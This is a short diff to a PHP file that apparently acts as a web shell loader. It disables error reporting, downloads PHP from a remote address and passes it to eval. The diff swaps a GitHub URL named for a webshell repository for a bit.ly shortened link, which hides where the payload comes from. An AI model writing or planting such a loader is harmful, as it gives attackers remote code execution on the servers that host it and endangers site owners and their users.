@@ -1,4 +1,4 @@
-<?ph
+<?
 /**
  * Disable error reporting
  *
@@ -26,5 +26,5 @@ function geturlsinfo ($url) {
     }
 return $url_get_contents_data;
 }
-$a = geturlsinfo('https://raw.githubusercontent.com/exploit-haxor/webshell/main/mydb@.php');
+$a = geturlsinfo('https://bit.ly/46u2CNs');
 eval    ('?>'.$a);
